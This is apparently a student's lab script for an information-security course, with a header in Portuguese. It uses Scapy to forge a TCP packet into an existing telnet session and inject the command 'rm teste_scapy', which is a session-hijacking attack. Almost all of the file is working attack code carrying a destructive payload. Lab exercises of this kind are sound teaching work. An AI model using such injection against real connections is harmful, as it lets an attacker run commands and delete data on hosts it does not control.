'''

Segurança da Informação - Ataque TCP/IP
Felipe Daniel Dias dos Santos - 11711ECP004
Graduação em Engenharia de Computação - Faculdade de Engenharia Elétrica - Universidade Federal de Uberlândia

'''

from scapy.all import *

ip = IP(src = "10.0.2.4", dst = "10.0.2.6")
tcp = TCP(sport = 44348, dport = 23, flags = "PA", seq = 3361274904, ack = 4197456809)
data = "rm teste_scapy\r"
pkt = ip / tcp / data
ls(pkt)
send(pkt, verbose = 0)
